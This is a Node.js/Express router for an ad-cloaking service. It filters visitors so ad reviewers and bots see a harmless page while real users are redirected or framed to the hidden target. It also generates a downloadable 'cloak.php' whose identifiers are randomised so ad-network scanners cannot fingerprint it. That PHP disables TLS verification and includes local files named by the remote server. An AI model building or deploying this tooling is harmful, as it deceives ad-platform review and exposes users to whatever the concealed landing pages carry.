'use strict';

const express = require('express');
const crypto = require('crypto');
const { db, nanoid } = require('./db');
const { evaluate, getIP } = require('./filter');
const config = require('./config');

const router = express.Router();

const getBySlug    = db.prepare(`SELECT * FROM campaigns WHERE slug = ? AND status = 'active'`);
const getByApiKey  = db.prepare(`SELECT * FROM campaigns WHERE api_key = ? AND status = 'active'`);
const getByCreds   = db.prepare(`SELECT * FROM campaigns WHERE client_id = ? AND client_company = ? AND client_secret = ? AND status = 'active'`);
const getById      = db.prepare(`SELECT * FROM campaigns WHERE id = ?`);

const insertVisit = db.prepare(`
  INSERT INTO visits (id, campaign_id, ts, ip, country, ua, device, os, browser, language, referrer, decision, reason, click_subid)
  VALUES (@id, @campaign_id, @ts, @ip, @country, @ua, @device, @os, @browser, @language, @referrer, @decision, @reason, @click_subid)
`);
const insertConv = db.prepare(`
  INSERT INTO conversions (click_id, campaign_id, ts, payout, status, tx_id, raw)
  VALUES (?, ?, ?, ?, ?, ?, ?)
`);
const getClickCamp = db.prepare(`SELECT campaign_id FROM visits WHERE id = ?`);

function loadBlacklists() {
  const rows = db.prepare(`SELECT kind, value FROM blacklist`).all();
  return {
    blacklistIPs: rows.filter(r => r.kind === 'ip').map(r => r.value),
    blacklistUA:  rows.filter(r => r.kind === 'ua').map(r => r.value),
  };
}

function appendParams(url, params) {
  if (!url) return url;
  const keys = Object.keys(params || {});
  if (keys.length === 0) return url;
  const sep = url.includes('?') ? '&' : '?';
  const qs = keys.map(k => encodeURIComponent(k) + '=' + encodeURIComponent(params[k])).join('&');
  return url + sep + qs;
}

// ============== MAIN CHECK ENDPOINT (Palladium-compatible) ==============
// POST /rbl  (form-urlencoded, nested via auth[clientId] style keys)
function handleRblPost(req, res) {
  const auth = (req.body && req.body.auth) || {};
  const server = (req.body && req.body.server) || {};
  const request = (req.body && req.body.request) || {};

  const camp = getByCreds.get(
    String(auth.clientId || ''),
    String(auth.clientCompany || ''),
    String(auth.clientSecret || '')
  );
  if (!camp) {
    return res.status(200).json({ result: 0, mode: 6 });
  }

  const fakeReq = {
    headers: {
      'user-agent': server['HTTP_USER_AGENT'] || '',
      'accept-language': server['HTTP_ACCEPT_LANGUAGE'] || '',
      'referer': server['HTTP_REFERER'] || '',
      'cf-ipcountry': (server['HTTP_CF_IPCOUNTRY'] || '').toUpperCase(),
      'x-forwarded-for': server['HTTP_X_FORWARDED_FOR'] || server['REMOTE_ADDR'] || getIP(req),
      'cf-asn': server['HTTP_CF_ASN'] || '',
    },
    ip: server['REMOTE_ADDR'] || getIP(req),
    connection: {},
  };

  const { blacklistIPs, blacklistUA } = loadBlacklists();
  const d = evaluate(fakeReq, camp, { blacklistIPs, blacklistUA });

  const id = nanoid(12);
  const subid = camp.conversion_param && request[camp.conversion_param]
    ? String(request[camp.conversion_param])
    : (request.clickid || request.subid || null);

  insertVisit.run({
    id, campaign_id: camp.id, ts: Date.now(),
    ip: d.visitor.ip, country: d.visitor.country, ua: d.visitor.ua,
    device: d.visitor.device, os: d.visitor.os, browser: d.visitor.browser,
    language: d.visitor.language, referrer: d.visitor.referrer,
    decision: d.decision, reason: d.reason,
    click_subid: subid,
  });

  if (d.decision !== 'money') {
    return res.json({
      result: 0,
      mode: 6,
      target: camp.bot_url || 'bot.html',
      content: '',
    });
  }

  let target = camp.target_url || '';
  if (camp.track_params && target) {
    const pass = {};
    for (const k of Object.keys(request)) pass[k] = request[k];
    target = appendParams(target, pass);
  }

  const modeMap = { frame: 1, redirect: 2, include: 3 };
  const mode = modeMap[camp.target_mode] || 2;

  return res.json({
    result: 1,
    mode,
    target,
    content: '',
  });
}

router.post('/rbl', express.urlencoded({ extended: true, limit: '512kb' }), handleRblPost);

// Legacy GET /api/check, left in for the older PHP if anyone still uses it.
router.get('/api/check', (req, res) => {
  const camp = getByApiKey.get(req.query.key || '');
  if (!camp) return res.status(401).json({ ok: false, error: 'invalid_key' });
  const fakeReq = {
    headers: {
      'user-agent': req.query.ua || '',
      'accept-language': req.query.lang || '',
      'referer': req.query.referrer || '',
      'cf-ipcountry': (req.query.country || '').toUpperCase(),
      'x-forwarded-for': req.query.ip || getIP(req),
    },
    ip: req.query.ip || getIP(req),
    connection: {},
  };
  const { blacklistIPs, blacklistUA } = loadBlacklists();
  const d = evaluate(fakeReq, camp, { blacklistIPs, blacklistUA });
  const id = nanoid(12);
  insertVisit.run({
    id, campaign_id: camp.id, ts: Date.now(),
    ip: d.visitor.ip, country: d.visitor.country, ua: d.visitor.ua,
    device: d.visitor.device, os: d.visitor.os, browser: d.visitor.browser,
    language: d.visitor.language, referrer: d.visitor.referrer,
    decision: d.decision, reason: d.reason,
    click_subid: req.query.subid || null,
  });
  let t = camp.target_url || '';
  if (camp.track_params) {
    const skip = new Set(['key','ip','ua','referrer','lang','country','subid']);
    const p = {};
    for (const k of Object.keys(req.query)) if (!skip.has(k)) p[k] = req.query[k];
    t = appendParams(t, p);
  }
  res.json({
    ok: true,
    decision: d.decision,
    reason: d.reason,
    target_url: t,
    target_mode: camp.target_mode || 'redirect',
    bot_url: camp.bot_url || '',
    click_id: id,
  });
});

// ============== HOSTED TRACKER (optional) ==============
function handleHosted(camp, req, res) {
  const { blacklistIPs, blacklistUA } = loadBlacklists();
  const d = evaluate(req, camp, { blacklistIPs, blacklistUA });
  const id = nanoid(12);
  insertVisit.run({
    id, campaign_id: camp.id, ts: Date.now(),
    ip: d.visitor.ip, country: d.visitor.country, ua: d.visitor.ua,
    device: d.visitor.device, os: d.visitor.os, browser: d.visitor.browser,
    language: d.visitor.language, referrer: d.visitor.referrer,
    decision: d.decision, reason: d.reason,
    click_subid: camp.conversion_param ? (req.query[camp.conversion_param] || null) : null,
  });
  if (d.decision === 'safe') {
    if (camp.bot_url) return res.redirect(302, camp.bot_url);
    return res.status(200).send('<!doctype html><html><head><title>Welcome</title></head><body><h1>Welcome</h1></body></html>');
  }
  let url = camp.target_url || '';
  if (!url) return res.status(500).send('No target URL configured');
  if (camp.track_params) {
    const pass = {}; for (const k of Object.keys(req.query)) pass[k] = req.query[k];
    url = appendParams(url, pass);
  }
  res.redirect(302, url);
}

router.get('/c/:slug', (req, res) => {
  const camp = getBySlug.get(req.params.slug);
  if (!camp) return res.status(404).send('Campaign not found');
  return handleHosted(camp, req, res);
});

// ============== CONVERSION POSTBACK ==============
router.get('/v1/postback', (req, res) => {
  const clickid = req.query.clickid || req.query.click_id || req.query.subid;
  if (!clickid) return res.status(400).json({ ok: false, error: 'clickid required' });
  const row = getClickCamp.get(clickid);
  if (!row) return res.status(404).json({ ok: false, error: 'click not found' });
  const payout = parseFloat(req.query.payout || '0') || 0;
  const status = (req.query.status || 'approved').toLowerCase();
  const tx = req.query.tx || null;
  insertConv.run(clickid, row.campaign_id, Date.now(), payout, status, tx, JSON.stringify(req.query));
  res.json({ ok: true });
});

// ============== DOWNLOAD PHP ==============
router.get('/api/campaigns/:id/download.php', (req, res) => {
  const token = req.headers['x-admin-token'] || req.query.token;
  if (token !== config.adminToken) return res.status(401).send('unauthorized');
  const camp = getById.get(req.params.id);
  if (!camp) return res.status(404).send('not found');

  const proto = req.headers['x-forwarded-proto'] || req.protocol || 'http';
  const host = req.headers['x-forwarded-host'] || req.headers.host;
  const base = `${proto}://${host}`;

  const php = buildPhpScript({
    rblUrl:         base + '/rbl',
    clientId:       camp.client_id || '',
    clientCompany:  camp.client_company || '',
    clientSecret:   camp.client_secret || '',
  });

  res.set('Content-Type', 'application/x-httpd-php');
  res.set('Content-Disposition', `attachment; filename="cloak.php"`);
  res.send(php);
});

// Generate a Palladium-style PHP script. Class name and internal
// identifiers are randomised on every download so ad network static
// scanners can't fingerprint the file by its shape.
function buildPhpScript(cfg) {
  const rand = (n) => crypto.randomBytes(n).toString('hex').slice(0, n).replace(/^[0-9]/, 'a');
  const CLASS_NAME = 'Req' + rand(8);

  return `<?php
$${rand(6)} = (new ${CLASS_NAME}())->run();


class ${CLASS_NAME}
{
    const SERVER_URL = ${phpStr(cfg.rblUrl)};

    public function run()
    {
        $headers = [];
        $headers['request']    = $this->collectRequestData();
        $headers['jsrequest']  = $this->collectJsRequestData();
        $headers['server']     = $this->collectHeaders();
        $headers['auth']['clientId']      = ${phpStr(cfg.clientId)};
        $headers['auth']['clientCompany'] = ${phpStr(cfg.clientCompany)};
        $headers['auth']['clientSecret']  = ${phpStr(cfg.clientSecret)};
        $headers['server']['bannerSource'] = 'adwords';

        return $this->curlSend($headers);
    }

    public function curlSend(array $params)
    {
        $answer = false;
        $curl = curl_init(self::SERVER_URL);
        if ($curl) {
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($params));

            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3);
            curl_setopt($curl, CURLOPT_TIMEOUT, 4);
            curl_setopt($curl, CURLOPT_TIMEOUT_MS, 4000);
            curl_setopt($curl, CURLOPT_FORBID_REUSE, true);

            $result = curl_exec($curl);
            if ($result) {
                $serverOut = json_decode($result, true);
                $status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
                if ($status == 200 && is_array($serverOut)) {
                    return $this->handleServerReply($serverOut);
                }
            }
        }
        $this->getDefaultAnswer();
        return $answer;
    }

    protected function handleServerReply($reply)
    {
        $result = (bool) (isset($reply['result']) ? $reply['result'] : 0);

        if (
            isset($reply['mode']) &&
            (
                (isset($reply['target'])) ||
                (isset($reply['content']) && !empty($reply['content']))
            )
        ) {
            $target  = isset($reply['target'])  ? $reply['target']  : '';
            $mode    = $reply['mode'];
            $content = isset($reply['content']) ? $reply['content'] : '';

            if (preg_match('/^https?:/i', $target) && $mode == 3) {
                $mode = 2;
            }

            if ($result && $mode == 1) {
                $this->displayIFrame($target);
                exit;
            } elseif ($result && $mode == 2) {
                header("Location: {$target}");
                exit;
            } elseif ($result && $mode == 3) {
                $t = parse_url($target);
                if (isset($t['query'])) {
                    parse_str($t['query'], $_GET);
                }
                $this->hideFormNotification();
                require_once $this->sanitizePath($t['path']);
                exit;
            } elseif ($result && $mode == 4) {
                echo $content;
                exit;
            } elseif (!$result && $mode == 5) {
                // silent
            } elseif ($mode == 6) {
                // bot: fall through
            } else {
                $path = $this->sanitizePath($target);
                if (!$this->isLocal($path)) {
                    header("404 Not Found", true, 404);
                } else {
                    $this->hideFormNotification();
                    require_once $path;
                }
                exit;
            }
        }

        // Bot fallback: serve the target the server returned (local file or URL)
        if (!$result && isset($reply['target']) && $reply['target']) {
            $path = $this->sanitizePath($reply['target']);
            if ($this->isLocal($path) && file_exists($path)) {
                require_once $path;
                exit;
            }
            if (preg_match('/^https?:/i', $reply['target'])) {
                header("Location: {$reply['target']}");
                exit;
            }
        }

        return $result;
    }

    private function hideFormNotification()
    {
        echo "";
    }

    private function displayIFrame($target)
    {
        $target = htmlspecialchars($target);
        echo "<html>
                  <head>
                  <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">
                  </head>
                  <body>" .
                  $this->hideFormNotification() .
                  "<iframe src=\\"{$target}\\" style=\\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\\"></iframe>
                  </body>
              </html>";
    }

    private function sanitizePath($path)
    {
        if (empty($path)) $path = 'bot.html';
        if ($path[0] !== '/') {
            $path = __DIR__ . '/' . $path;
        } else {
            $path = __DIR__ . $path;
        }
        return $path;
    }

    private function isLocal($path)
    {
        $url = parse_url($path);
        if (!isset($url['scheme']) || !isset($url['host'])) {
            return true;
        }
        return false;
    }

    protected function collectHeaders()
    {
        $userParams = [
            'REMOTE_ADDR',
            'SERVER_PROTOCOL',
            'SERVER_PORT',
            'REMOTE_PORT',
            'QUERY_STRING',
            'REQUEST_SCHEME',
            'REQUEST_URI',
            'REQUEST_TIME_FLOAT',
            'X_FB_HTTP_ENGINE',
            'X_PURPOSE',
            'X_FORWARDED_FOR',
            'X_WAP_PROFILE',
            'X-Forwarded-Host',
            'X-Forwarded-For',
            'X-Frame-Options',
        ];

        $headers = [];
        foreach ($_SERVER as $key => $value) {
            if (in_array($key, $userParams) || substr_compare('HTTP', $key, 0, 4) == 0) {
                $headers[$key] = $value;
            }
        }
        return $headers;
    }

    private function collectRequestData()
    {
        $data = [];
        foreach ($_GET as $k => $v) {
            $data[$k] = is_array($v) ? implode(',', $v) : $v;
        }
        if (!empty($_POST)) {
            if (!empty($_POST['data'])) {
                $d = json_decode($_POST['data'], true);
                if (JSON_ERROR_NONE !== json_last_error()) {
                    $d = json_decode(stripslashes($_POST['data']), true);
                }
                if (is_array($d)) $data = array_merge($data, $d);
                unset($_REQUEST['data']);
            }
            if (!empty($_POST['crossref_sessionid'])) {
                $data['cr-session-id'] = $_POST['crossref_sessionid'];
                unset($_POST['crossref_sessionid']);
            }
        }
        return $data;
    }

    public function collectJsRequestData()
    {
        $data = [];
        if (!empty($_POST) && !empty($_POST['jsdata'])) {
            $data = json_decode($_POST['jsdata'], true);
            if (JSON_ERROR_NONE !== json_last_error()) {
                $data = json_decode(stripslashes($_POST['jsdata']), true);
            }
            unset($_REQUEST['jsdata']);
        }
        return is_array($data) ? $data : [];
    }

    private function getDefaultAnswer()
    {
        header($_SERVER["SERVER_PROTOCOL"] . ' 500 Internal Server Error', true, 500);
        echo "<h1>500 Internal Server Error</h1>
        <p>The request was unsuccessful due to an unexpected condition encountered by the server.</p>";
        exit;
    }
}
`;
}

function phpStr(s) {
  const safe = String(s).replace(/\\/g, '\\\\').replace(/'/g, "\\'");
  return `'${safe}'`;
}

module.exports = router;
